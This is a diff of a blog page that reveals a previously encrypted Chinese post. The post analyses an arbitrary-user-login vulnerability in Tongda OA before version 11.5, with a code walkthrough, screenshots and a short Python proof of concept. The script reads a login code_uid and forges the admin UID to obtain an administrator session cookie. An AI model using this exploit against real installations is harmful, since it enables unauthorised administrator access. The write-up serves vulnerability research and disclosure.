@@ -35,18 +35,23 @@
 <link rel="canonical" href="https://glotozz.github.io/2020/04/22/通达OA-11-5任意用户登录漏洞分析/"/>
 
 
-<meta name="description" content="Here&#39;s something encrypted.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通达OA &lt; 11.5任意用户登录漏洞分析">
 <meta property="og:url" content="https://glotozz.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA-11-5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="glotozz&#39;blog">
-<meta property="og:description" content="Here&#39;s something encrypted.">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/04/22/vwaKRXp38kFLiV2.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/22/eSYg4VjXrmkRcpD.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/22/ZqfztVTs2rbpI8y.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/22/yCGFucTiofnSZ7h.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/22/bMdiBrn25mjv8PG.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/22/AyNm3lcCRkiB7t9.png">
 <meta property="article:published_time" content="2020-04-22T09:43:04.000Z">
-<meta property="article:modified_time" content="2020-04-23T04:51:36.708Z">
+<meta property="article:modified_time" content="2020-04-28T12:28:14.056Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="php代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/04/22/vwaKRXp38kFLiV2.png">
 
 
 <link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
@@ -151,15 +156,50 @@
 
     
             <div class="post-content">
-            <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">password is required to continue reading.</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="18793458919ff8d25dc7d6ad310f253f5f974a7487eae9c332be8808ec5798d3">c45ee8a5e762cff1d6db04dea8a8de6e83acd37a742fc3cce3340e1734932cec4bd4ae03c636ddf7ed456fa5a6608dca836b03d3e8dd8fa0afdbf0c4588e9dcd894d40db833f46c9e8a96e96833b52a8506e0af0ce6ae80f1cecf5640637b77e7efd279da02eecb89234890adc15b57d87b7a88d72db2f93c3395d56a608b8dc8de474aa630a67c1c8b39333e0193a178339dae34039c611a34b6ce9a6d61fc70acf9d39bb876484a258cce67aa33a3e0da001ffa8a5df94c33a8860c65f11217b26c7d0e04098015f33899ab4ee5316125ca595d3b3f86294eb09e24fa2fd08c01c0fce0adc48de5e381a0b915fb5a2f8e0b9b70c03ee28c1b28057f388baef914fdb234b2fc42d90b677a6d0fc1adbef49811f604a190a22eab0bbdbaede52e67c12aaa5d38f1e6d0323b620b9c605e4c9dc5b7724ecb29449505e8b351cf4ebaf197e416a8b3d8aa2acd294a7ff1a91b4ddc89b98b0dbb8344bbb7248dc6bdabd980cd98e96431f1b35db94d13dfd79fa2b8790d0203ae854a17966c85809ffdbea6fc7d34bc42a447f3b39f63124c58fab4f2f289665c8b5a33bd173c508a4efb96241408605591439719b9414c002ff34d15249b1ddc60dfa05a65fcd8c7717ba3c18c072a30f913d0082b1734a5cff936e97ef343878d6ec457f5551cf8a84d25f4ebc6e19f080ea1b8a4cc9d44f10cd07285b2d120c976043ff2cd39fdc34c6684877ecd2b990faf1edbc166faf471f700595cb000486c580ae1202a446da0044d7bf2926b1d81c93830ea3704b9909e1436039dc322c0ca460b78746b8f7b9c613c0160856a1ff4fac1d852b6581ce37fde0b1ba2cd62fcc2726c4a8a5edd8e6a79235b286a5f3325f9fd8a1b7016909c835bd1a53b6f6d9b5e1660ebe44b9ac51201b5b10a6d64c4b5827e7cb30d80c7ae5240c07a3f5ac5dc34ed027fefc357eabeaed1248d0abb955515e3af57ce024f0b07f3a8f16bcdb764768a9360552069c7526e0881ec7f00ccc1985f6754776a60d43e7d96072ec81c6311760d3d1788351b18e8800ff351b69cd80d6290a18391dd12524df6749c67b5b68abc2799a8fdba2978a2777f1d4013042ca366fdeaef08d66a7bb3b4bc8c0050d1be5ac3421776af11d4548bee09e66f72c9bb74753ea45ee21297d09355b65a7de1ecef2f2c5244e0c8ab9e8d646caef5bf17939058fcc01a11aa4c05d37187b77e0f2462b9a8978d206db59f1969d4d85778d4686200ff6ef565b1e18c6e0b5fc8e7ee155ce619a7422052e6d519fff386ce491165760321451d23a97434547e16d2aa67ec0659674245e97820c785f47122d92269bf3cf1b85c7d6e400d6951d5bfd8bbd334a39c3585ca6df8e7ff7865ec3d65b156e6e1c7347dafa9343ab053724b11153ffc6dfc18bd74936025f53553e930930eb9458e1c8d7732f522ebd72f25008e8bf44f2125a0499214cf3c3788b4c2d10e19180ad16017a7e0db849ba9d9d4d955144aefec2e3ce27025ede70e96b8eb5b1754f85be03ac03835d24e9b192668b67670797a66e4fe8dae123539d27ffa1a28bb2bc288112343fd8d8ef3faa5a0fcfa43c3b7c11c01340c058bedbc2b15ccd6dbaf0086b7ca89d4fc55989fb80a7821d5a3d0c989bd84f9c6f3cec621c3d705769023ec0d5955444828fce0352104e812be2f7cbd52cfa89c8efe06755c53d718aad535fbc4aaf2c1472decdaf29f2c83d015000c6e3bcdb61c1d253c86975b97edc5a6c9dbe7ca448516cc007cdcdc2761e05b0e742e5384f7658a80cf981e093e66e71b1442b50a5f40f6d58cda1566c5f91b9961b06f16520198fb6a0e72e3e089745fc890afccce155508bd9268ccfa8603448cf65ae9760ecc9040e33c98d51cf909ce54edd014511a2367f90d953ec6f375b181e61ba835b4926443ec5bc84ec75ce0b71d0dce23eb1e61091c12b29bdca364441d5af228a9739bbdd9f4a9e0e6de914bc6d21bae434b6d2de67787dca3f604a555a2b564083cbe0437077ba2b3cfedf6e6559c3b568c871d40b27666e2f430f9b9150266a6bbba7c4daffdbb38acf007e5970d17e632950c39cbdc214663f4db7774aaac208f24de2fade6d4f120ac2700eb30f1580dd22159607b2fb8ea743b293a7f3a972143a5e52ba225f73c71a75a31f250206b82304902fa532b48582cbfc85e00b1e1dd5d07478cc753d2acb1336120fff3157dbeece447fcfc5205f3229df066e2872bf16635ff3b07bbcc99439c1a4e2e32c6d936638b6ab68c249fc702a130fcf0f922995ea44d543366333b132f913c0a81d7802ad0b32b6d42e218093b659101862ccc59c90edbccaf41e8388ab7e61ed02c57f962e5285ce28e8ba03fcbdca5069786b2bec68fc8c75e3259243417fbf3bfdc3638e9a0eb74c8f8dcf177bd9143526a8b6c957f1687b705e96ee9633ce72d5dc21c2b9942ff368a5d7e56147d7c20e47182b99109fd5cbcffaae5602aeb9c40f752ae1180311bec9d7a4662db692e011b1f7f44ed0d243e063dcaa73f008e1741e35ee35b070ae92c798bbeba25055816aa658fde96652ddf0cbad3383f2133853b08b6727b2457e5d8aaf0113166a3be1cbe39a56149674b46c3a44283bca4dfc6ebee04fc19e1773b92d544570410e528e5f3415ddc5665824eeea9f450bea0b3fbc5a7fa5e1fc1e21a915f52028f3b699197092a114e68ea58ce199db414a2498bc6b067b6490868a610bd1963e3bbb3dfdf6d1b0bddc499c08399c7f938cba8aad3256bacd42a3bc4e96c883c1d0c7b4f0881ca3c02a2aac5cc6edf074138009437759d6a1838a5d1d2927eebd474034d8de40fc71ff38cb3c70df59424f96473434579d38a204b33fd69e8e99a8308609773e69da66b105d2975ad854ef6f5b1f6f303ce203539f21f985a91f1717f653f86b3abcf0b0877188af7c7d03b5e60d1ebdeb7bbbd4f8c43235da7e7207ff6314770b6144d19b3c4b624f5a50abe03d626a4c9c95120605dc8f86dd4b3142181832e721529972177aa7630b8ea3f4a1d7b21e6167ab69f4ca70261fb1a19869cb899b6ffd507237ec6b0cb85a6d98c0ac001b9b823672e6703089c6cc83d7be6454cafc210a360650c7730e7f4a562766e4ccd9a1d92829b399a1f4feca370214bd0203e740a544a435c84a5373b59795a35d6d1fb036e7b46ce28c4a31d6456bac4abb2ea05aa1227d801fa8e2cd7846bc456cc76e6663d742f0a714b7f6eff6fd2c98e3b1ff00021a44e42d7a4ffbbf94bdfb17e6863b61d3c4c97fcf10f9c64107d126c46596742c0aad0ca41241f2f001938d48bf4ec15bd2304f93f1b79a95b3f218d06bd688e4927999a3eda9caed8e27bda21456d621e0d9c37361d576218a9f6b4958a47c16bf750aa191c27950dbef9eb6c5139b28d3e2861533a17851ad5077a87eaf0edfe02d7013e347141c0151b876f525cdc378ba92eab7c49c3518c14a71490cc7c1385698e4c01ee2ecfc50484ac66fdd023326cc7cb747e63441baf171544e587e7fdcd527a66a1bb2e4f10b93a3b65117e5feeac5ad62cc69ff5957ae74127f32bdeee9946781d7345ef90312ccd57df85980baefe4973172281d3e48065413b4697dc4f48b7ee1c97d96aa467a60ff3600805f9167ed7582f77cf479033298fd2f611a53230007d17fe09f5d427995d4ab18701b4242a62b42a24a1628275e4e32d92cdf1365866be1cea1c7861646cb2273bbe77bcfb61c5824a2d76d73ea203afab408755309ca1ad86a56d5e5a07859efcb32614192ea8b0d551fbcd03f263e6350c9b773b065c4d4a5b26de753c690555e0a1149c1ffdeddac0c6ad1d0ca2f40289221a3eba0f1b67ba9e1107767a86f7f916eb25162588a59868c99b8d9cb0d0d74437ec975f967b6dc44dc07031940891ffb6610ffe1d86340a19a865b51e2206cd8e0c69bd37d05a86fcd1fb7798e1c735ccfc7e05558440e2d7657d1e5ebad3261de932ba53fa1eba38504f1aa7ab5a1b51e8e289a994a279d57fa6b27541f52c5dbd76ee197c5a868054b7a9a61b16e653cacf7aaa806b8e724dcfc80442d072c0aeae92a7358c6745fc860bae49a35c075479f34a39473ac16ffc3f31baa56a94d51a4e43440da2fd1506e56329c0210652f22e8ececa24129e8f68ed92ec48e4d931d4c8c43899c9379839386758835a9719894c1c4a95734eddd130c5979fb123d0fba5aaf00b946be2ad4ccadceb767e1b79a9ad6b5035d60f975067fb9139bdb17a41eb3acd488a3f06fc5fe3f2760fa4d03e5f5cbb2126b9990b2075179c2f99c2ca0ccb9a4c490d9008c344c10d4ddf39445b3efc426cc390f84fc04376385fc20fcab9436a256384299223472d8ff045d32400f6c42e812fea7b53d3c7f83f6bdca47986d543cb57d2bb2fb5e56db18b962bc4537cc870e18f0d2aa5520c43432870aa7ab72c9dc0bded405395923d0b5bedf7d0a0182d752349562b323415d61767701fa9adbea18d06e44d856a25e9ffae3c7751ec48e08c5bbc17922703152b77cd8f3434bc92079b947eb24a309e1d83a2ad86596e5f11bc73aeb992816713cc87ae96fe57a0b17a1de694538d27071e356b8f703037dafb8cdb0b31edd947ceae7d2be6198aa4211819c5624a988b499fdaf1a15b013b3658e6336a4d06b633655aa5b24fae2c8fc7d8ee727ea60c2e1931adac59b02c93b4047ccbf1ae0781115a894b808effb0b92364711527c7bbe6a03cc0269b6ad4a48bb918067984feaccc63c29bb5d010c9e7e79997c6845ebb4cf85523105137df792ab9742356813a97cb3a8cfe0a5e60dc1db30a90934adbf89dc5b70be186f435aa0d6117047041712f6059f29a59f4c5c3030b5c868082e394f20ec95d4de93156cf8dd57ee0d3958da9738c8da569c7b6a4024ec92ce5108dc9646e8720758509891f14a69c69955b3c2e43127d891419d602229997afb0b832d448c06b1560d09d26a2ce34296c973f14fc730559d53bbab974a3e9c9617628648915385fb1ef507eb2f22171454773416c78742c48c63298e76c01bcb1577beee0365e76cd3acbd04bf5ec80c5c1e3de697725632991738d5b8bfbd71978a3c4c52b5ad0a3c7b24867db6984e45c1da2759420b2d284a2f477933de9871fd9a951105b0243e0a6accb0c84db910d3b84703ead14edf29d3874823a11ab3a97982cb81cf0b7d6ba411d9771aa848dda7863708a40cf5cec5d3da0df0be7f5e335d9f54fffcb00f70b15b22f2054b10cc355ef3ccab7a7532319ac24b515c3daad086e069abbf6a7b5f916f62903947949ec02b858c0da00f9aa7d4c64a71b47853c10b84798c306d731fbaea7e0eabe1a61999676f765af38e3f7d1d511f9471a0b7bd569365ca738c38e8d9d765e18e4291dd877379ba0237538e704864610bea77fd8b5a4348674c4422a99f6c6b03177eb4b970b18ab3e7c6e14731d713d70a9b8c8d3f1c6a23d7bd191586162e4559385cb77a25dbb8cc8041ad840d1260a039a6bb229c471ce3c88abde9740aed1b4071673b7ceba24a787cfd8d8d0c10a09dde23a25adcdb44b5fa389ab3c243d7d8e85692dae2d0969edc54bade11bf536ba735bc3ada077b50351227ba901817889f59ba7992cad3f7eae00fa22b3ce5e5127451026d2de65712911b6c405b7e147c390885f5de407f21612901d331cce946d99d4983c76bc3ce7550e87a0f642a3c0fcac97e4f58ae989e30de551969de647b37e9b51721d694221ffa5560a3995c855bbb3182963148bb182a1077a22f773fdd2371a7d1d6a05e95732fdcbbfdc305f1fa8c316edb008ccfb6f2615b0272f6edc8389fa7a2a1eefd63848de447909a24b30722aa145a6b2fa6d3000381aeea710df1e254bb325965218f29861bcf5f228a2a61f642c99d2d2d9c61663593d4cdc7cb694a0b9e148ae387f9d3e14b47685ed93ffaef78cdddebc8ff20aae967cd3b71c45d3bf4c85a6386cb0d634f2f2a21ce263b5e0ceaf5388200b88f804bba1a55b782371b3a50d68b519a904fd7256be669a8287f57ab94d3710dc02c2e02b4746f3ab0faf908c4ee5ab917f2162cef2c34cfd2fac31a3ba76ad4b9b901256686786d60823cb578c33840552e67a34e89f88b8c85b50d6053ca1a245b955ee8acea79df8cbc30ffe2f2185eecaf5ec957d51c51b52bfb935ac96fd94b7c6e965c44e66fc8eacd55ec85d4b4fe08df361fce58f3b0b52763c09e325b2394c5f1ab378d9ef22868cc68231f9e102bc05609e9d3c51b2ab095b213f982385208e1cc78e7ee4b84f9a17801e01ccf383ca1d4411813536206c151cddb4b8532bde44b1ffd28a74e68fea70c85da78560b216ad7c6561dbc0b489a45c2e7b7ae3cf2ca7b29dd51c09c0f1e78b941f60de27de9afefa1d687edbffbc458a6be211b5fa9867d91f40a910f9e3e6e22b0da7ca4e62c45c54c4bafa83adf6b622d70cdc41db6cb6a2a60d498dd8e0066fd43cc90b4afbb9f71b97f2db328b29b814126c21713aa47fa223852d16293b859858a6e834732f099e535af8fdf1cbaf9940ddd2b30231a7293d2bf22b0db163b51ed4e7942c4ff149efeb4ecfb7518af2fd51ec30fa2f3b4ba754b0b533de1d9f5acf14853c10183b9ba880c9e39d2e7514f4e812ddf40860332c063b7aa1345519397fe9e5fcffdbb1d049144cb63d8556a24e3a4ef28da7e8041022684f03cb37a4d20b96e0f3fc1a13c775bd3a7dfe25c21419bc0caee09fbdb7bb2c0623a22f6253c211dd61305b282e64936923c6b4586eec585725a044bf39ccbd5f94173667ce7b3e6c3823b2cd485604b6017f4519538eced0fc020b292179239696e716b6caaf886c0b1e7b70889140cd43d84b883faa1fe9ee6ffd3b899d69220e09389b7a185d9e2c13038cde571c3cd1ea048348f0e8a075d70e4b74da2e1061f0d8e99b713716797bd65df1c4b7ed2d31eeaff99afde200c485f7902a4cd7e9e4064e41db3a37bb22acb33e96375a2c8f0462eca550ce795b2b15bab4d08ac4e0485e7b317ce603c46e0301f35d1b3a8dcc87480e77d1671655ff30c4855e8dd9b9ef34979d1e400b2370461d86e011696893d2112830399c67dd6c6a48bf138008612a8644f458b1b7a32ffb174a07964545f2cfc078aa5e97771d248c82544a276ae6ade601489a4ea8ba22b36b49e2e7ed06c84d9c5506e3d68c65e7630077ccf866e9dca8cdc64f38209c89d3eda0067422d4207519a087fc8a004ebc048c1795502260546d0788a374dadd22e228607131b85fc25ef37d506910ee65aa2db2ef9a3ab9c1f46b27497918c2db419631c13e0d39533471adeaa6b20c19bae380b91f65206e20079973678aa09027726c3f379c52bc589533226a616f64584e86382c780d3c06874197a1064052903b5b60c5e104af4dcf0fb2a0000a3daa385a70a44387b09aa57bd6ae62f5a2f70caf34e51edb0b1b2d27e048c27ba1f01f9f05be09e9611567ba70c14a9f479cf891ced27f9af30faa871a25b67031c688e51e72ef4574b675577055049435cd2cd7399ac86bef8970c4746c9d1201680f16927c8a160df0e</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#环境搭建">环境搭建</a></li>
+<li><a href="#漏洞分析">漏洞分析</a></li>
+<li><a href="#漏洞复现">漏洞复现</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h4><span id="环境搭建">环境搭建</span></h4><p>下载通达<code>OA11.5</code></p>
+<blockquote>
+<p><a href="http://www.tongda2000.com/download/2019.php?F=&amp;K=" target="_blank" rel="noopener">http://www.tongda2000.com/download/2019.php?F=&amp;K=</a> </p>
+</blockquote>
+<p>官网没有提供<code>V11.4</code>，可以从<code>11.3</code>的服务器管理更新得到。</p>
+<p>diff不同，最终找到任意用户登录漏洞触发点</p>
+<h4><span id="漏洞分析">漏洞分析</span></h4><p><code>logincheck_code.php</code></p>
+<p><img src="https://i.loli.net/2020/04/22/vwaKRXp38kFLiV2.png" alt="Snipaste_2020-04-22_20-52-39.png"></p>
+<p><code>intval()</code>防止sql注入，但是这里用户可以伪造任意<code>UID</code>，默认admin用户的<code>UID</code>为1</p>
+<p>需要绕过15行的判断，只要查询得到的<code>$login_codeuid</code>不为空即可。</p>
+<p>跟进<code>get_cache()</code></p>
+<p><img src="https://i.loli.net/2020/04/22/eSYg4VjXrmkRcpD.png" alt="Snipaste_2020-04-22_20-54-56.png"></p>
+<p>根据传入的id进行查询</p>
+<p>那么全局搜索调用<code>set_cache()</code>，并且设置<code>CODE_LOGIN</code>的地方，只有一处</p>
+<p><code>general/login_code.php</code></p>
+<p><img src="https://i.loli.net/2020/04/22/ZqfztVTs2rbpI8y.png" alt="Snipaste_2020-04-22_21-03-59.png"></p>
+<p>那么可以通过这个页面读取<code>code_uid</code>，再去之前的页面伪造身份。</p>
+<h4><span id="漏洞复现">漏洞复现</span></h4><p>1、</p>
+<p><img src="https://i.loli.net/2020/04/22/yCGFucTiofnSZ7h.png" alt="Snipaste_2020-04-22_21-30-06.png"></p>
+<p>2、</p>
+<p><img src="https://i.loli.net/2020/04/22/bMdiBrn25mjv8PG.png" alt="Snipaste_2020-04-22_21-29-25.png"></p>
+<p>3、</p>
+<p><img src="https://i.loli.net/2020/04/22/AyNm3lcCRkiB7t9.png" alt="Snipaste_2020-04-22_21-28-39.png"></p>
+<p>poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1:8088"</span></span><br><span class="line">url1 = url + <span class="string">"/general/login_code.php"</span></span><br><span class="line">url2 = url + <span class="string">"/logincheck_code.php"</span></span><br><span class="line">url3 = url + <span class="string">"/general/index.php"</span></span><br><span class="line">r = requests.get(url1).content</span><br><span class="line">tmp = re.search(<span class="string">r'code_uid":"(.*?)"&#125;'</span>, r.decode(<span class="string">"ISO-8859-1"</span>))  <span class="comment"># utf-8' codec can't decode byte</span></span><br><span class="line"><span class="comment"># print(tmp.group(1))</span></span><br><span class="line">codeuid = tmp.group(<span class="number">1</span>)</span><br><span class="line">r = requests.post(url2, data=&#123;<span class="string">'UID'</span>: <span class="number">1</span>, <span class="string">'CODEUID'</span>: codeuid&#125;).headers</span><br><span class="line">cookie = r[<span class="string">'Set-Cookie'</span>][:<span class="number">-7</span>]</span><br><span class="line"><span class="comment"># print(tmp)</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>: cookie</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url3, headers=headers).content</span><br><span class="line"><span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> r.decode(<span class="string">"ISO-8859-1"</span>):</span><br><span class="line">    print(<span class="string">"ok"</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA</a></p>
+
             </div>
           
 
@@ -201,8 +241,8 @@
       </a>
     
     
-      <a class="next" href="/2020/04/21/Java-EE%EF%BC%88SSM%EF%BC%89%E4%BC%81%E4%B8%9A%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/">
-        <span class="next-text nav-default">Java EE（SSM）企业应用实践</span>
+      <a class="next" href="/2020/04/20/NPUCTF-wp/">
+        <span class="next-text nav-default">NPUCTF-wp</span>
         <span class="prev-text nav-mobile">Next</span>
         <i class="iconfont icon-right"></i>
       </a>
